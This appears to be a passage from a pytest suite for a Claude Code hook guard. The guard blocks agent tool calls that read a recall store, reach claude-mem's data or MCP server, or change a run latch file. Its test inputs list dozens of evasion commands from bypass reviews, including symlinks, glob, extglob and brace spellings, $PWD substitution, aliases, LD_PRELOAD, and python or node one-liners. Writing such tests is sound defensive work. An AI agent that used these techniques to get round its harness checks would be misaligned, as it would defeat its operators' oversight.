    _symlink_or_skip(link, store_world.store.parent)
    inside = f"{link.as_posix()}/recall/runs/x.jsonl"

    for tool, tool_input in (
        ("Bash", {"command": f"cat {inside}"}),
        ("Read", {"file_path": inside}),
        ("Glob", {"pattern": "*.jsonl", "path": f"{link.as_posix()}/recall/runs"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_bash(store_world, f"ls {link.as_posix()}"))


def test_csr_symlink_to_the_store_is_the_store(store_world: _StoreWorld) -> None:
    link = store_world.tmp / "store-link"
    _symlink_or_skip(link, store_world.store)
    code, out = _bash(store_world, f"ls {link.as_posix()}")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.skipif(not os.path.isdir("/proc/self/root"), reason="no /proc/self/root here")
def test_csr_proc_self_root_spelling_denied(store_world: _StoreWorld) -> None:
    """Bypass review 3."""
    code, out = _bash(store_world, f"cat /proc/self/root{store_world.s}/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.skipif(sys.platform == "win32", reason="`//` starts a UNC path on Windows")
def test_csr_double_slash_prefix_denied(store_world: _StoreWorld) -> None:
    """POSIX abspath keeps exactly two leading slashes; the guard collapses them
    (bypass review 3)."""
    path = f"/{store_world.s}/runs/x.jsonl"
    for tool, tool_input in (("Bash", {"command": f"cat {path}"}), ("Read", {"file_path": path})):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


_OVER_THE_BRACE_CAP = "{" + ",".join(f"d{index}" for index in range(80)) + ",recall}"


@pytest.mark.parametrize(
    "command",
    [
        "ls ~/.ultracode-goal/recall*",
        "cat ~/.ultracode-goal/rec?ll/runs/x.jsonl",
        "cat ~/.ultracode-goal/[r]ecall/runs/x.jsonl",
        "cat ~/.ultracode-goal/{recall,other}/runs/x.jsonl",
        "cat ~/{.ultracode-goal/recall,other}/runs/x.jsonl",
        "cat ~/.ultracode-goal/re{c..c}all/runs/x.jsonl",
        f"cat ~/.ultracode-goal/{_OVER_THE_BRACE_CAP}/runs/x.jsonl",
    ],
    ids=["star", "question-mark", "bracket", "brace-list", "brace-across-a-slash", "brace-sequence", "brace-past-the-cap"],
)
def test_csr_glob_and_brace_spellings_of_the_store_denied(store_world: _StoreWorld, command: str) -> None:
    """A glob that can match the store, and a brace expansion that yields it
    (bypass review 4, bmad review 15)."""
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_glob_and_brace_tool_patterns_denied(store_world: _StoreWorld) -> None:
    home = store_world.home.as_posix()
    for tool, tool_input in (
        ("Glob", {"pattern": f"{home}/.ultracode-goal/rec*/**"}),
        ("Glob", {"pattern": "rec*/**/*.jsonl", "path": store_world.store.parent.as_posix()}),
        ("Grep", {"pattern": "x", "glob": f"{home}/.ultracode-goal/{{recall,other}}/**"}),
        ("Read", {"file_path": f"{home}/.ultracode-goal/rec?ll/runs/x.jsonl"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_globs_and_braces_that_miss_the_store_are_allowed(store_world: _StoreWorld) -> None:
    """Controls: alternatives and globs that cannot be the store, and `**` from
    a folder above it (the accepted ancestor-search residual)."""
    parent = store_world.store.parent.as_posix()
    for tool, tool_input in (
        ("Bash", {"command": "cat ~/.ultracode-goal/{other,more}/x"}),
        ("Bash", {"command": "ls ~/.ultracode-goal/other*"}),
        ("Bash", {"command": "cat ~/.ultracode-goal/re[x]all/y"}),
        ("Bash", {"command": "echo {a,b} && ls src/*.py"}),
        ("Bash", {"command": f"cat {parent}/**/x"}),
        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
    ):
        _assert_allowed(*_run_in(store_world, tool, tool_input))


@pytest.mark.parametrize(
    "command",
    [
        "cat ~+/.ultracode-goal/recall/runs/x.jsonl",
        "cat $PWD/.ultracode-goal/recall/runs/x.jsonl",
        "cat ${PWD}/.ultracode-goal/recall/runs/x.jsonl",
        'rm -rf "$(pwd)/.ultracode-goal/recall"',
        "rm -rf $( pwd -P )/.ultracode-goal/recall",
        'rm -rf "`pwd`/.ultracode-goal/recall"',
    ],
    ids=["tilde-plus", "dollar-pwd", "braced-pwd", "pwd-substitution", "pwd-P-substitution", "pwd-backticks"],
)
def test_csr_cwd_spellings_read_as_the_event_cwd(store_world: _StoreWorld, command: str) -> None:
    """`~+`, `$PWD`, `${PWD}`, `$(pwd)` and a backtick `pwd` are the event's
    cwd, here the home (bypass review 5; PR 3 latch review A2)."""
    code, out = _bash(store_world, command, cwd=store_world.home)
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "command",
    [
        "shopt -s extglob\nrm -rf ~/.ultracode-goal/recal@(l)",
        "shopt -s extglob\nls ~/.ultracode-goal/recal+(l)/runs",
        "ls ~/.ultracode-goal/!(x)/runs",
        "cat ~/.ultracode-goal/?(recall)/runs/x.jsonl",
        "cat ~/.ultracode-goal/*(recall)/runs/x.jsonl",
    ],
    ids=["at", "plus", "bang", "question", "star"],
)
def test_csr_store_extglob_spelling_denied(store_world: _StoreWorld, command: str) -> None:
    """PR 3 latch review A3: a bash extglob group reads as a `*`, so it is a
    glob that can match the store, as the guard says it finds."""
    _assert_latch_denied(*_bash(store_world, command), store_world.latch)


@pytest.mark.parametrize(
    "spelling",
    ["${HOME:-/x}", "${HOME%/}", "${HOME#}", "${USERPROFILE:-/x}"],
    ids=["default", "suffix-strip", "prefix-strip", "userprofile-default"],
)
def test_csr_home_parameter_expansions_read_as_the_home(store_world: _StoreWorld, spelling: str) -> None:
    """Bypass review 5."""
    code, out = _bash(store_world, f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_ansi_c_quoted_store_path_denied(store_world: _StoreWorld) -> None:
    """`$'\\x..'` escapes spell the store without naming it literally (bypass review 5)."""
    escaped = "".join(f"\\x{ord(char):02x}" for char in store_world.s)
    for command in (f"cat $'{escaped}'/runs/x.jsonl", "cat $'\\x7e'/.ultracode-goal/recall/x"):
        code, out = _bash(store_world, command)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_macos_folds_case_and_form_on_the_deny_side_only(guard_module, monkeypatch) -> None:
    """On macOS, whose file systems ignore case and Unicode form by default, the
    deny side compares NFC-normalized and casefolded paths; the exemption does
    not, so a pinned name in another case is not the pinned script on a
    case-sensitive volume (bypass review 7)."""
    monkeypatch.setattr(guard_module, "_FOLD_CASE_AND_FORM", True)
    composed = os.path.join(os.sep, "Users", "u", "Caf\u00e9", "Recall")
    decomposed = os.path.join(os.sep, "users", "u", "cafe\u0301", "recall")

    assert guard_module._fold(composed) == guard_module._fold(decomposed)
    roots = guard_module._roots(composed)
    assert guard_module._names_store(
        os.path.join(decomposed, "runs", "x.jsonl"), roots, [os.sep], [], os.sep, whole=True
    )
    if sys.platform != "win32":  # normcase already folds case there
        pinned = guard_module._pinned_paths()[0]
        other_case = os.path.join(os.path.dirname(pinned), os.path.basename(pinned).upper())
        assert not guard_module._is_pinned(other_case)
        assert guard_module._is_pinned(pinned)


@pytest.mark.parametrize(
    "command",
    [
        "cat ~/.claude-m'e'm/claude-mem.db",
        'cat ~/.claude-"mem"/claude-mem.db',
        "cat ~/.claude-m\\em/claude-mem.db",
        "cat ~/.claude-m?m/claude-mem.db",
        "cat ~/.claude-m*/claude-mem.db",
        "cat ~/.c*/claude-mem.db",
        "cat ~/.claude-{mem,x}/claude-mem.db",
        "cat ~/.c{l,x}aude-mem/claude-mem.db",
        "cat $'\\x2e'claude-mem/claude-mem.db",
        # Named outside any home: only the literal check, past its quoting, sees these.
        "cat /srv/.claude-m'e'm/claude-mem.db",
        "grep -rn x /srv/.claude-m\\em",
    ],
    ids=[
        "single-quoted",
        "double-quoted",
        "backslash",
        "question-mark",
        "star",
        "short-star",
        "brace",
        "brace-inside",
        "ansi-c",
        "quoted-outside-a-home",
        "backslash-outside-a-home",
    ],
)
def test_csr_claude_mem_spelled_around_quotes_globs_and_braces_denied(
    store_world: _StoreWorld, command: str
) -> None:
    """Bypass review 8: the literal check reads past quotes and backslashes, and
    a glob or brace expansion that reaches claude-mem's folder under a home
    counts too."""
    code, out = _bash(store_world, command)
    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "reaches into '.claude-mem'" in reason


def test_csr_claude_mem_tool_patterns_denied(store_world: _StoreWorld) -> None:
    home = store_world.home.as_posix()
    for tool, tool_input in (
        ("Glob", {"pattern": f"{home}/.claude-m*/**"}),
        ("Grep", {"pattern": "x", "glob": home + "/.claude-{mem,x}/**"}),
        ("Read", {"file_path": f"{home}/.claude-m?m/claude-mem.db"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        reason = _assert_latch_denied(code, out, store_world.latch)
        assert "reaches into '.claude-mem'" in reason


def test_csr_dot_globs_away_from_claude_mem_are_allowed(store_world: _StoreWorld) -> None:
    """Controls: a dot glob in the repo is not claude-mem's folder under a home."""
    for command in ("ls -d .*", "cat ./.c*", "ls ~/.config/x", "grep -rn claude src"):
        _assert_allowed(*_bash(store_world, command))


_RESOURCE_TOOLS = ("ReadMcpResourceTool", "ListMcpResourcesTool", "ReadMcpResourceDirTool")


@pytest.mark.parametrize(
    "server",
    [
        "plugin:claude-mem:mcp-search",
        "plugin:claude-mem:mem_search",
        "plugin:claude-mem:mem.search",
        "claude-mem",
        "claude_mem",
        "claude.mem",
    ],
)
@pytest.mark.parametrize("tool", _RESOURCE_TOOLS)
def test_csr_mcp_resource_calls_on_claude_mem_denied(store_world: _StoreWorld, tool: str, server: str) -> None:
    """A resource read or listing reaches the claude-mem server through its
    `server` input, not its tool name (bypass review 9)."""
    code, out = _run_in(store_world, tool, {"server": server, "uri": "claude-mem://x"})
    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call on the claude-mem MCP server {server}." in reason


@pytest.mark.parametrize(
    "server", ["claude-memory", "claude.memory", "plugin:claude-memoir:x", "plugin:claude-memoir:mem_search", "Neon", None]
)
def test_csr_mcp_resource_calls_elsewhere_are_allowed(store_world: _StoreWorld, server: str | None) -> None:
    """The server is matched as Claude Code writes it into a tool name, so a
    look-alike stays one. A read with no server reaches none (it needs one)."""
    tool_input = {"uri": "x://y"} if server is None else {"server": server, "uri": "x://y"}
    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", tool_input))


@pytest.mark.parametrize("tool_input", [{}, {"server": ""}], ids=["no-server", "empty-server"])
def test_csr_resource_listing_of_every_server_denied(store_world: _StoreWorld, tool_input: dict) -> None:
    """A listing that names no server lists every server's resources,
    claude-mem's included."""
    code, out = _run_in(store_world, "ListMcpResourcesTool", tool_input)
    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "refusing a ListMcpResourcesTool call that names no server" in reason


def test_csr_resource_listing_of_another_server_allowed(store_world: _StoreWorld) -> None:
    """Controls: a listing that names another server, and any listing with no latch."""
    _assert_allowed(*_run_in(store_world, "ListMcpResourcesTool", {"server": "Neon"}))
    store_world.latch.unlink()
    _assert_allowed(*_run_in(store_world, "ListMcpResourcesTool", {}))


def test_csr_no_latch_leaves_mcp_resource_calls_alone(store_world: _StoreWorld) -> None:
    store_world.latch.unlink()
    _assert_allowed(*_run_in(store_world, "ReadMcpResourceTool", {"server": "claude-mem", "uri": "x"}))


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
def test_csr_fifo_at_the_latch_path_does_not_hang_the_guard(store_world: _StoreWorld) -> None:
    """A FIFO at the latch path is a present latch that cannot be read: the
    claude-mem deny still fires and nothing blocks on the read (C-2: no store,
    so no path deny)."""
    store_world.latch.unlink()
    os.mkfifo(store_world.latch)
    env = {**os.environ, **store_world.env}

    def run(tool: str, tool_input: dict) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(HOOK)],
            input=json.dumps(_mem_event(tool, store_world.cwd, tool_input)),
            cwd=store_world.cwd,
            capture_output=True,
            text=True,
            env=env,
            timeout=60,
        )

    denied = run("mcp__claude-mem__search", {})
    assert denied.returncode == 2, denied.stdout
    allowed = run("Read", {"file_path": f"{store_world.s}/runs/x.jsonl"})
    assert (allowed.returncode, allowed.stdout) == (0, "")


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no FIFOs here")
def test_csr_fifo_latch_held_open_by_a_writer_reads_as_unreadable(guard_module, tmp_path: Path) -> None:
    """A FIFO whose writer holds it open and has filled it with a green latch
    neither blocks the read nor yields a latch: the read past its data meets
    no end of file, so the latch reads as None."""
    fifo = tmp_path / ".mem-state.json"
    os.mkfifo(fifo)
    writer = os.open(fifo, os.O_RDWR)  # holds the FIFO open, so it never blocks
    try:
        os.write(writer, json.dumps(_v2_latch(tmp_path / "store")).encode("utf-8"))
        assert guard_module._read_latch(fifo) is None
    finally:
        os.close(writer)


def test_csr_oversized_latch_reads_as_unreadable(guard_module, store_world: _StoreWorld) -> None:
    small = json.dumps(_v2_latch(store_world.store))
    store_world.latch.write_text(small + " " * guard_module._LATCH_READ_CAP, encoding="utf-8")
    assert guard_module._read_latch(store_world.latch) is None
    store_world.latch.write_text(small, encoding="utf-8")
    assert guard_module._read_latch(store_world.latch) == json.loads(small)


# --- Guard item 7: the latch-path rule (decision 11) ---------------------------
# While a latch is present, whatever it holds, a model tool call may read the
# latch but not change it (AC-29, AC-30), and only the pinned recall scripts
# change it. `latch_world` lays the folders out as a real run does: the
# implementation artifacts inside the project, the project under the home, so
# every home and working-folder spelling of the latch path can be written.


@pytest.fixture
def latch_world(tmp_path: Path) -> _StoreWorld:
    """A green v2 latch at <home>/work/repo/_bmad-output/implementation-artifacts,
    with the session's working folder at <home>/work/repo."""
    home = tmp_path / "home"
    store = home / ".ultracode-goal" / "recall"
    cwd = home / "work" / "repo"
    impl = cwd / "_bmad-output" / "implementation-artifacts"
    store.mkdir(parents=True)
    _write_state(impl, _v2_latch(store))
    return _StoreWorld(home, store, cwd, impl, tmp_path)


_LATCH_REL = "_bmad-output/implementation-artifacts/.mem-state.json"


def _latch_spellings(world: _StoreWorld) -> dict[str, str]:
    from_home = f"work/repo/{_LATCH_REL}"
    return {
        "absolute": world.latch.as_posix(),
        "relative-to-cwd": _LATCH_REL,
        "dot-relative": f"./{_LATCH_REL}",
        "tilde": f"~/{from_home}",
        "dollar-home": f"$HOME/{from_home}",
        "braced-home": f"${{HOME}}/{from_home}",
        "percent-userprofile": f"%USERPROFILE%/{from_home}",
        "dollar-pwd": f"$PWD/{_LATCH_REL}",
        "glob": "_bmad-output/implementation-artifacts/.mem-state.js??",
        "brace": "_bmad-output/implementation-artifacts/.mem-{state,cache}.json",
    }


_LATCH_SPELLINGS = (
    "absolute",
    "relative-to-cwd",
    "dot-relative",
    "tilde",
    "dollar-home",
    "braced-home",
    "percent-userprofile",
    "dollar-pwd",
    "glob",
    "brace",
)


@pytest.mark.parametrize("channel", ["bash-rm", "bash-redirect", "write"])
@pytest.mark.parametrize("spelling", _LATCH_SPELLINGS)
def test_csr_latch_spelling_denied(latch_world: _StoreWorld, spelling: str, channel: str) -> None:
    """AC-29: one deny per accepted spelling of the latch path, through a Bash
    removal, a Bash redirection and the Write tool."""
    path = _latch_spellings(latch_world)[spelling]
    if channel == "write":
        code, out = _run_in(latch_world, "Write", {"file_path": path, "content": "{}"})
        reason = _assert_latch_denied(code, out, latch_world.latch)
        assert "refusing a Write call whose file_path names the run latch." in reason
        return
    command = f"rm -f {path}" if channel == "bash-rm" else f"echo '{{}}' > {path}"
    reason = _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)
    assert "names the run latch and may change it." in reason


def test_csr_latch_reached_through_a_symlink_denied(latch_world: _StoreWorld) -> None:
    """AC-29: a link to the latch, and a link to its folder, lead to the latch,
    so writing through either is a change; reading through one is not."""
    to_latch = latch_world.tmp / "latch-link.json"
    to_folder = latch_world.tmp / "impl-link"
    _symlink_or_skip(to_latch, latch_world.latch)
    _symlink_or_skip(to_folder, latch_world.impl)

    for path in (to_latch.as_posix(), f"{to_folder.as_posix()}/.mem-state.json"):
        for tool, tool_input in (
            ("Bash", {"command": f"echo '{{}}' > {path}"}),
            ("Write", {"file_path": path, "content": "{}"}),
        ):
            _assert_latch_denied(*_run_in(latch_world, tool, tool_input), latch_world.latch)
    _assert_allowed(*_bash(latch_world, f"cat {to_latch.as_posix()}"))


@pytest.mark.parametrize(
    "tool,key",
    [("Write", "file_path"), ("Edit", "file_path"), ("MultiEdit", "file_path"), ("NotebookEdit", "notebook_path")],
    ids=["Write", "Edit", "MultiEdit", "NotebookEdit"],
)
def test_csr_latch_named_by_a_writing_tool_denied(latch_world: _StoreWorld, tool: str, key: str) -> None:
    """AC-29: each tool that writes files is denied on the latch path."""
    code, out = _run_in(latch_world, tool, _file_input(tool, key, latch_world.latch.as_posix()))
    reason = _assert_latch_denied(code, out, latch_world.latch)
    assert f"refusing a {tool} call whose {key} names the run latch." in reason


def _latch_changes(world: _StoreWorld) -> dict[str, str]:
    latch = world.latch.as_posix()
    other = (world.tmp / "other.json").as_posix()
    return {
        # The forms decision 11 names (AC-29).
        "rm": f"rm -f {latch}",
        "mv-away": f"mv {latch} {other}",
        "mv-onto": f"mv {other} {latch}",
        "cp-onto": f"cp {other} {latch}",
        "ln-onto": f"ln -sf {other} {latch}",
        "tee": f"echo '{{}}' | tee {latch}",
        "redirect": f"echo '{{}}' > {latch}",
        "append": f"echo '{{}}' >> {latch}",
        "glued-redirect": f"printf x >{latch}",
        "clobber-redirect": f": >| {latch}",
        "sed-i": f"sed -i s/on/off/ {latch}",
        "truncate": f"truncate -s 0 {latch}",
        "python-c": f"python -c \"open('{latch}', 'w').write('{{}}')\"",
        "relative-rm": f"rm {_LATCH_REL}",
        # The named forms are examples, not the rule: anything else is a change.
        "dd": f"dd if=/dev/null of={latch}",
        "touch": f"touch {latch}",
        "chmod": f"chmod 000 {latch}",
        "find-delete": f"find {latch} -delete",
        "git-checkout": f"git checkout -- {latch}",
        # The working folder spelled as a substitution (PR 3 latch review A2).
        "pwd-substitution": f'rm -f "$(pwd)/{_LATCH_REL}"',
        "pwd-backticks": f'rm -f "`pwd`/{_LATCH_REL}"',
        "pwd-substitution-redirect": f'echo x > "$(pwd)/{_LATCH_REL}"',
        # An extglob group reads as a `*` (A3).
        "extglob-at": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.@(json)",
        "extglob-plus": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.+(json)",
        "extglob-bang": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.!(x)",
        "extglob-question": f"shopt -s extglob\nrm -f {_LATCH_DIR}/.mem-state.?(json)",
        # The file name on its own, with no path to it (B).
        "cd-then-rm": f"cd {_LATCH_DIR} && rm -f .mem-state.json",
        "cd-semicolon-rm": f"cd {world.impl.as_posix()}; rm .mem-state.json",
        "pushd-then-rm": f"pushd {_LATCH_DIR} && rm .mem-state.json",
        "subshell-cd-rm": f"(cd {_LATCH_DIR} && rm .mem-state.json)",
        "cd-then-redirect": f"cd {_LATCH_DIR} && echo '{{}}' > .mem-state.json",
        "cd-then-truncate": f"cd {_LATCH_DIR} && : > .mem-state.json",
        "cd-then-dot-glob": f"cd {_LATCH_DIR} && rm -f .mem*",
        "cd-then-short-dot-glob": f"cd {_LATCH_DIR} && rm -f .m*",
        "cd-then-quoted-name": f"cd {_LATCH_DIR} && rm -f '.mem-state'.json",
        "cd-then-escaped-name": f"cd {_LATCH_DIR} && rm -f \\.mem-state.json",
        "cd-then-braced-name": f"cd {_LATCH_DIR} && rm -f .mem-{{state,x}}.json",
        "variable-folder": f"D={_LATCH_DIR}; rm -f $D/.mem-state.json",
        "oldpwd-tilde": f"cd {_LATCH_DIR} && cd - && rm -f ~-/.mem-state.json",
        "proc-cwd": f"rm -f /proc/$$/cwd/{_LATCH_REL}",
        "find-name-delete": "find . -name .mem-state.json -delete",
        "find-glob-delete": f"find {_LATCH_DIR} -name '.mem-*' -delete",
        "find-exec-rm": f"find {world.impl.as_posix()} -name .mem-state.json -exec rm {{}} +",
        "globstar": "shopt -s globstar\nrm -f **/.mem-state.json",
        "python-join": (
            f"python3 -c \"import os; os.remove(os.path.join('{_LATCH_DIR}', '.mem-state.json'))\""
        ),
        "python-concat": f"python3 -c \"import os; os.remove('{_LATCH_DIR}/' + '.mem-state.json')\"",
        "python-heredoc": (
            f"python3 - <<'EOF'\nimport os\nos.remove(os.path.join('{_LATCH_DIR}', '.mem-state.json'))\nEOF"
        ),
        "node-e": f"node -e \"require('fs').unlinkSync('{_LATCH_DIR}/' + '.mem-state.json')\"",
        "ansi-c-name": f"cd {_LATCH_DIR} && rm -f $'\\x2emem-state.json'",
        # Windows drops a file name's trailing dots, so these name the latch there.
        "cd-then-trailing-dot": f"cd {_LATCH_DIR} && rm -f .mem-state.json.",
        "trailing-dots": f"rm -f {latch}..",
    }


_LATCH_DIR = "_bmad-output/implementation-artifacts"


_LATCH_CHANGES = (
    "rm",
    "mv-away",
    "mv-onto",
    "cp-onto",
    "ln-onto",
    "tee",
    "redirect",
    "append",
    "glued-redirect",
    "clobber-redirect",
    "sed-i",
    "truncate",
    "python-c",
    "relative-rm",
    "dd",
    "touch",
    "chmod",
    "find-delete",
    "git-checkout",
    "pwd-substitution",
    "pwd-backticks",
    "pwd-substitution-redirect",
    "extglob-at",
    "extglob-plus",
    "extglob-bang",
    "extglob-question",
    "cd-then-rm",
    "cd-semicolon-rm",
    "pushd-then-rm",
    "subshell-cd-rm",
    "cd-then-redirect",
    "cd-then-truncate",
    "cd-then-dot-glob",
    "cd-then-short-dot-glob",
    "cd-then-quoted-name",
    "cd-then-escaped-name",
    "cd-then-braced-name",
    "variable-folder",
    "oldpwd-tilde",
    "proc-cwd",
    "find-name-delete",
    "find-glob-delete",
    "find-exec-rm",
    "globstar",
    "python-join",
    "python-concat",
    "python-heredoc",
    "node-e",
    "ansi-c-name",
    "cd-then-trailing-dot",
    "trailing-dots",
)


@pytest.mark.parametrize("name", _LATCH_CHANGES)
def test_csr_bash_change_to_the_latch_denied(latch_world: _StoreWorld, name: str) -> None:
    """AC-29: one denied case per changing form. Past the named forms, the
    latch review's bypasses: the working folder as a substitution, extglob,
    and the file name with no path to it (a `cd` first, `find -name`, a path
    an interpreter joins)."""
    reason = _assert_latch_denied(*_bash(latch_world, _latch_changes(latch_world)[name]), latch_world.latch)
    assert "names the run latch and may change it." in reason


def _latch_unsure_reads(world: _StoreWorld) -> dict[str, str]:
    latch = world.latch.as_posix()
    other = (world.tmp / "other.json").as_posix()
    evil = (world.tmp / "evil").as_posix()
    return {
        "read-into-a-file": f"cat {latch} > {other}",
        "into-the-latch": f"cat {other} > {latch}",
        "read-write-open": f"cat <> {latch}",
        "stderr-to-dev-null": f"cat {latch} 2>/dev/null",
        "piped-into-xargs": f"ls {latch} | xargs rm",
        "piped-into-a-shell": f"ls {latch} |& sh",
        "last-word": f'cat {latch}; rm -f "$_"',
        "braced-last-word": f'test -e {latch} && rm -f "${{_}}"',
        "function-named-cat": f'cat() {{ rm -f "$1"; }}; cat {latch}',
        "alias": f"alias cat='rm -f'; cat {latch}",
        "path-assignment": f"PATH={evil}:$PATH cat {latch}",
        "export-path": f"export PATH={evil}; cat {latch}",
        "ld-preload": f"LD_PRELOAD={evil}/x.so cat {latch}",
        "reader-by-relative-path": f"./cat {latch}",
        "reader-by-absolute-path": f"/bin/cat {latch}",
        "env-wrapper": f"env cat {latch}",
        "sudo-wrapper": f"sudo cat {latch}",
        "bash-c": f"bash -c 'cat {latch}'",
        "command-substitution": f"cat {latch} $(rm -f {latch})",
        "backticks": f"cat {latch} `rm -f {latch}`",
        "process-substitution": f"cat <(rm -f {latch})",
        "unbalanced-quote": f"cat '{latch}",
        "less-o": f"less -o {latch} {other}",
        "sed-n": f"sed -n p {latch}",
        "mention": f"echo 'remove {latch} later'",
        # `=~` hands the match on through BASH_REMATCH (PR 3 latch review A1).
        "rematch": f'[[ {latch} =~ .* ]] && rm -f "$BASH_REMATCH"',
        "rematch-group": f'[[ {_LATCH_REL} =~ (.*) ]] && rm -f "${{BASH_REMATCH[1]}}"',
        "rematch-newline": f'[[ {latch} =~ .* ]]\nmv "$BASH_REMATCH" {other}',
        # The guard splits at `|` whatever the quoting, so a quoted pipe in a
        # read's pattern makes a "pipe" into a piece that is not a read.
        "quoted-pipe-in-a-pattern": f"grep -E 'run_id|recall' {latch}",
        # The file name alone, in a command that is not a read, is denied.
        "name-mention": "echo 'the latch is .mem-state.json'",
    }


_LATCH_UNSURE_READS = (
    "read-into-a-file",
    "into-the-latch",
    "read-write-open",
    "stderr-to-dev-null",
    "piped-into-xargs",
    "piped-into-a-shell",
    "last-word",
    "braced-last-word",
    "function-named-cat",
    "alias",
    "path-assignment",
    "export-path",
    "ld-preload",
    "reader-by-relative-path",
    "reader-by-absolute-path",
    "env-wrapper",
    "sudo-wrapper",
    "bash-c",
    "command-substitution",
    "backticks",
    "process-substitution",
    "unbalanced-quote",
    "less-o",
    "sed-n",
    "mention",
    "rematch",
    "rematch-group",
    "rematch-newline",
    "quoted-pipe-in-a-pattern",
    "name-mention",
)


@pytest.mark.parametrize("name", _LATCH_UNSURE_READS)
def test_csr_latch_read_the_guard_cannot_vouch_for_is_denied(latch_world: _StoreWorld, name: str) -> None:
    """Decision 11, fail closed: a segment naming the latch that the guard
    cannot tell only reads it is denied. Each of these reads, or looks like a
    read, yet can change the latch or hand its path to a command that does."""
    _assert_latch_denied(*_bash(latch_world, _latch_unsure_reads(latch_world)[name]), latch_world.latch)


def _latch_reads(world: _StoreWorld) -> dict[str, str]:
    latch = world.latch.as_posix()
    return {
        "cat": f"cat {latch}",
        "cat-relative": f"cat {_LATCH_REL}",
        "cat-quoted": f'cat "{latch}"',
        "head": f"head -c 200 {latch}",
        "tail": f"tail -n 5 {latch}",
        "wc": f"wc -c {latch}",
        "grep": f"grep run_id {latch}",
        "jq": f"jq -r .run_id {latch}",
        "jq-input-redirect": f"jq -r .run_id < {latch}",
        "ls": f"ls -la {latch}",
        "stat": f"stat {latch}",
        "test": f"test -e {latch}",
        "bracket": f"[ -f {latch} ]",
        "double-bracket": f"[[ -f {latch} ]]",
        "cat-piped-into-jq": f"cat {latch} | jq -r .run_id",
        "read-then-other-work": f"cat {latch} && echo done",
        "if-test": f"if [ -e {latch} ]; then echo present; fi",
        "safe-assignment": f"LC_ALL=C grep run_id {latch}",
        "glob-listing": "ls _bmad-output/implementation-artifacts/.mem*",
        "cd-then-cat-by-name": f"cd {_LATCH_DIR} && cat .mem-state.json",
        "cd-then-list-dot-glob": f"cd {_LATCH_DIR} && ls -a .m*",
    }


_LATCH_READS = (
    "cat",
    "cat-relative",
    "cat-quoted",
    "head",
    "tail",
    "wc",
    "grep",
    "jq",
    "jq-input-redirect",
    "ls",
    "stat",
    "test",
    "bracket",
    "double-bracket",
    "cat-piped-into-jq",
    "read-then-other-work",
    "if-test",
    "safe-assignment",
    "glob-listing",
    "cd-then-cat-by-name",
    "cd-then-list-dot-glob",
)


@pytest.mark.parametrize("name", _LATCH_READS)
def test_csr_bash_read_of_the_latch_allowed(latch_world: _StoreWorld, name: str) -> None:
    """AC-30: a Bash read of the latch passes, so Finalize can read it."""
    _assert_allowed(*_bash(latch_world, _latch_reads(latch_world)[name]))


def test_csr_read_tools_on_the_latch_allowed(latch_world: _StoreWorld) -> None:
    """AC-30: Read, Grep and Glob only read, so the latch-path rule leaves
    them alone."""
    latch = latch_world.latch.as_posix()
    for tool, tool_input in (
        ("Read", {"file_path": latch}),
        ("Read", {"file_path": _LATCH_REL}),
        ("Grep", {"pattern": "run_id", "path": latch}),
        ("Glob", {"pattern": ".mem-state.json", "path": latch_world.impl.as_posix()}),
        ("Glob", {"pattern": "**/.mem-state.json"}),
    ):
        _assert_allowed(*_run_in(latch_world, tool, tool_input))


@pytest.mark.parametrize(
    "command",
    [
        "find . -type f -name '*.py' -not -path '*/.*'",
        "rm -f .*.tmp",
        "cp .env.example .env",
        f"rm -f {_LATCH_DIR}/.mem-state.json.bak",
        f"rm -f {_LATCH_DIR}/.mem-state-1a2b.tmp",
        "echo 'x.mem-state.json and .mem-state.jsonl are other files'",
        f"cd {_LATCH_DIR} && rm -f .current-story",
        f"cd {_LATCH_DIR} && rm -f .mem-state.json.1",
    ],
    ids=[
        "hidden-skip",
        "dot-glob-of-other-files",
        "dotfile-copy",
        "backup-name",
        "temp-name",
        "longer-names",
        "other-dotfile",
        "rotated-name",
    ],
)
def test_csr_latch_name_rule_leaves_other_names_alone(latch_world: _StoreWorld, command: str) -> None:
    """Control for the file-name rule: a dotfile glob that matches every
    hidden file (`.*`, the way `find -not -path '*/.*'` skips them), another
    dotfile, and a longer name that holds the latch's are not the latch."""
    _assert_allowed(*_bash(latch_world, command))


def _pinned_unlatch(world: _StoreWorld) -> str:
    return (
        f"uv run {_PINNED_RECALL.as_posix()} unlatch --impl-artifacts "
        f"{world.impl.as_posix()} --run-id {_RUN}"
    )


def test_csr_pinned_latch_and_unlatch_calls_allowed(latch_world: _StoreWorld) -> None:
    """AC-29 and AC-32 positive controls: the calls the prose makes at Stage 1
    and at each exit pass under a present latch."""
    recall = _PINNED_RECALL.as_posix()
    impl = latch_world.impl.as_posix()
    for command in (
        _pinned_unlatch(latch_world),
        f"python3 {recall} unlatch --impl-artifacts {impl} --run-id {_RUN}",
        (
            f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} "
            "--recall on --store ~/.ultracode-goal/recall"
        ),
        f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} --recall off --store ''",
    ):
        _assert_allowed(*_bash(latch_world, command))


